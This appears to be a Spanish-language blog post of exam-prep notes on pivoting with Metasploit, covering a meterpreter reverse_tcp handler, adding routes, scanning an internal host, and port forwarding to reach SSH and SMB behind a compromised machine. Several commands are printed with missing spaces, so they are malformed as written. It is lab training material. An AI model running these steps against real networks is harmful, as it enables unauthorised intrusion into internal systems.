---
layout: post
title:  "NMAP"
date:   2026-02-24 11:04:18 +0100
categories: jekyll update
author: mrallfredii
tags: pivoting portfwd
---

# Pivoting Linux

# ğŸ§  ESCENARIO REALISTA DE EXAMEN

### ğŸ”´ Kali (atacante)

```
192.168.1.100
```

### ğŸŸ¡ Linux intermedio (comprometido)

```
eth0 â†’ 192.168.1.50
eth1 â†’ 10.10.20.5
```

### ğŸ”µ Linux objetivo interno

```
10.10.20.15
```

Kali **NO puede acceder directamente** a `10.10.20.0/24`.

---

# ğŸ¥‡ PASO 1 â€” Tienes sesiÃ³n meterpreter en la mÃ¡quina intermedia

```
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST192.168.1.100
set LPORT4444
run
```

Obtienes:

```
meterpreter >
```

Verificas red:

```
meterpreter > ifconfig
```

Resultado:

```
eth0 â†’ 192.168.1.50
eth1 â†’ 10.10.20.5
```

ğŸ‘‰ Red interna detectada: `10.10.20.0/24`

---

# ğŸ¥ˆ PASO 2 â€” AÃ±adir ruta (FORMA CORRECTA DE EXAMEN)

AquÃ­ es donde muchos fallan.

## ğŸ”¹ OpciÃ³n 1 (CLÃSICA con route add)

Salimos a msfconsole (NO meterpreter):

```
background
```

Ver sesiones:

```
sessions
```

Ejemplo:

```
Id 1  meterpreter linux
```

AÃ±adir ruta manualmente:

```
route add10.10.20.0255.255.255.01
```

ğŸ“Œ Significado:

- Red: `10.10.20.0`
- MÃ¡scara: `255.255.255.0`
- SesiÃ³n: `1`

Verificar:

```
route print
```

Debe mostrar:

```
10.10.20.0/255.255.255.0 -> Session 1
```

---

---

# ğŸ¥‰ PASO 3 â€” Escaneo 1-1000 en ONE LINER

Ahora sÃ­ puedes escanear.

```
use auxiliary/scanner/portscan/tcp;set RHOSTS10.10.20.15;set PORTS1-1000;set THREADS50; run
```

Ejemplo de salida:

```
[+] 10.10.20.15:22 - TCP OPEN
[+] 10.10.20.15:80 - TCP OPEN
```

---

# ğŸ† PASO 4 â€” Port Forwarding

Queremos acceder al SSH del objetivo interno.

Volvemos a meterpreter:

```
sessions-i1
```

AÃ±adimos port forwarding:

```
portfwd add-l2222-p22-r10.10.20.15
```

Verificamos:

```
portfwd list
```

Salida:

```
0.0.0.0:2222 -> 10.10.20.15:22
```

---

# ğŸ PASO 5 â€” Acceso desde Kali

Desde terminal Kali:

```
ssh user@127.0.0.1-p2222
```

ğŸ”¥ Ahora estÃ¡s en el Linux interno.

# Pivoting Windows

# ğŸ¥ˆ PASO 2 â€” AÃ±adir ruta (FORMA CORRECTA DE EXAMEN)

AquÃ­ es donde muchos fallan.

## ğŸ”¹ Autoroute

Salimos a msfconsole (NO meterpreter):

```
background
```

```
use post/multi/manage/autoroute
```

Ver sesiones:

```
sessions
```

Ejemplo:

```
Id 1  meterpreter linux
```

AÃ±adir ruta manualmente:

```
set SESSION 1
```

```
run
```

```
route print
```

# ğŸ¥‰ PASO 3 â€” Encontrar hosts objetivo

```
use post/windows/gather/arp_scanner
```

```
set RHOSTS ip.0/24 (victima)
```

```
set session 1
```

```
run
```

# ğŸ† PASO 4 â€” Port proxy objetivo - intermedia

```
use post/windows/manage/portproxy
```

```
set connect_address ip vicitma
```

```
set connect_address 445 (smb ejemplo)
```

```
set local_address 0.0.0.0
```

```
set local_port 5000 (puerto en kali, el que queramos)
```

```
sessions -l
```

```
set session 1
```

```
run
```